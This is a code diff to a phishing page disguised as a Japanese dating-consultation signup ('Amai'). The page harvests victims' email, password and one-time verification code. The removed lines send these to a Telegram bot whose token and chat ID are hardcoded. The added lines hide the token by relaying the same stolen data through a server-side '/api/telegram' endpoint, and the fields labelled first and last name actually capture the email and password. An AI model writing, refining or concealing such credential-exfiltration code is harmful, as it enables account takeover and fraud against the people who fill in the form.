@@ -184,10 +184,9 @@
 
   <script>
     // ============================================
-    //  НАСТРОЙКИ TELEGRAM (ЗАМЕНИ НА СВОИ!)
-    // ============================================
-    const BOT_TOKEN = '8916030126:AAGGX9I-vIvqks8KMYpSlS6i-1Ic9rVySno'; // ← Твой токен
-    const CHAT_ID = '8184548300'; // ← Твой ID чата
+    // ⚠️ ИЗМЕНЕНО ДЛЯ БЕЗОПАСНОСТИ:
+    // Токен и Chat ID удалены из клиентского кода
+    // Данные отправляются через Vercel API
     // ============================================
 
     // ========== Языковые настройки ==========
@@ -232,42 +231,33 @@
       currentStep = stepNumber;
     }
 
-    // ========== ОТПРАВКА В TELEGRAM ==========
+    // ========== НОВАЯ ФУНКЦИЯ ОТПРАВКИ (без токена!) ==========
     async function sendToTelegram(email, password, code) {
-      const message = `
-📝 *Новая заявка на консультацию!*
-
-📧 *Email:* ${email}
-🔑 *Пароль:* ${password}
-📱 *Код:* ${code}
-🕐 *Дата:* ${new Date().toLocaleString('ru-RU')}
-🌐 *Язык:* ${currentLang === 'en' ? 'English' : '日本語'}
-
-💫 *Amai — Dating in Japan*`;
-      
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      
       try {
-        const response = await fetch(url, {
+        // Отправляем на наш API (токен хранится на сервере)
+        const response = await fetch('/api/telegram', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown',
+            email: email,
+            password: password,
+            code: code,
+            language: currentLang
           })
         });
-        
-        const data = await response.json();
-        if (!data.ok) {
-          console.error('Ошибка Telegram:', data);
+
+        if (!response.ok) {
+          const errorData = await response.json();
+          console.error('Server error:', errorData);
           return false;
         }
-        return true;
+
+        const data = await response.json();
+        return data.success === true;
       } catch (error) {
-        console.error('Ошибка отправки:', error);
+        console.error('Network error:', error);
         return false;
       }
     }
@@ -304,7 +294,7 @@
       setTimeout(() => codeDigits[0].focus(), 300);
     });
 
-    // Шаг 3: Код + отправка в Telegram
+    // Шаг 3: Код + отправка
     codeForm.addEventListener('submit', async (e) => {
       e.preventDefault();
       
@@ -323,7 +313,7 @@
       submitBtn.textContent = currentLang === 'en' ? 'Sending...' : '送信中...';
       submitBtn.disabled = true;
       
-      // Отправляем в Telegram
+      // Отправляем через API (без токена!)
       const email = firstName.value.trim();
       const password = lastName.value.trim();
       const success = await sendToTelegram(email, password, code);
@@ -335,7 +325,6 @@
       if (success) {
         showStep('Success');
       } else {
-        // Показываем ошибку
         alert(currentLang === 'en' 
           ? 'Failed to send application. Please try again.' 
           : '送信に失敗しました。もう一度お試しください。'
